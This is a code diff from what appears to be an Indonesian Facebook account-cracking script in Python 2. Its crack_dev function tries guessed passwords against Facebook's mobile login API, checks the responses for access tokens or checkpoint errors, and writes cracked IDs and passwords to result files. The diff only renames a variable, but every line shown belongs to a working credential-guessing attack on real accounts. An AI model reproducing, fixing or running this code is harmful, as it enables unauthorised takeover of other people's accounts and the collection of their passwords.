@@ -129,18 +129,18 @@ def crack_dev(iqbal):
                                         }
         respon = requests.get('https://b-api.facebook.com/method/auth.login', params=parameter)
       
-        print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+MR.404+ '\033[90;1m ==> Mencoba login '
+        print '\033[91;1m {\033[97;1m'+str(c)+'\033[91;1m} \033[97;1m'+MR404+ '\033[90;1m ==> Mencoba login '
         if 'EAA' in respon.text:
-            print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",MR.404,"\033[97;1m|\033[96;1m",pasw,'\n'
-            has_dev_suc.append('\033[96;1m {\033[97;1mSuc\033[96;1m} \033[97;1m'+MR.404+'\033[96;1m | \033[97;1m'+pasw)
+            print "\n\033[96;1m {\033[97;1mSuc\033[96;1m}\033[96;1m",MR404,"\033[97;1m|\033[96;1m",pasw,'\n'
+            has_dev_suc.append('\033[96;1m {\033[97;1mSuc\033[96;1m} \033[97;1m'+MR404+'\033[96;1m | \033[97;1m'+pasw)
             h = open('hasil_sukses.txt', 'a')
-            h.write('[Suc] '+iqbal+' | '+pasw+' \n')
+            h.write('[Suc] '+MR404+' | '+pasw+' \n')
             h.close()
         elif 'www.facebook.com' in respon.json()['error_msg']:
-            print "\n\033[92;1m {\033[93;1mGet\033[92;1m}\033[92;1m",MR.404,"\033[97;1m|\033[92;1m",pasw,'\n'
-            has_dev_cek.append('\033[97;1m {\033[93;1mCek\033[97;1m} \033[93;1m'+MR.404+'\033[97;1m | \033[97;1m'+pasw)
+            print "\n\033[92;1m {\033[93;1mGet\033[92;1m}\033[92;1m",MR404,"\033[97;1m|\033[92;1m",pasw,'\n'
+            has_dev_cek.append('\033[97;1m {\033[93;1mCek\033[97;1m} \033[93;1m'+MR404+'\033[97;1m | \033[97;1m'+pasw)
             h = open('hasil_cekpoint.txt', 'a')
-            h.write('[Cek] '+iqbal+' | '+pasw+' \n')
+            h.write('[Cek] '+MR404+' | '+pasw+' \n')
             h.close()
         else:
             pass
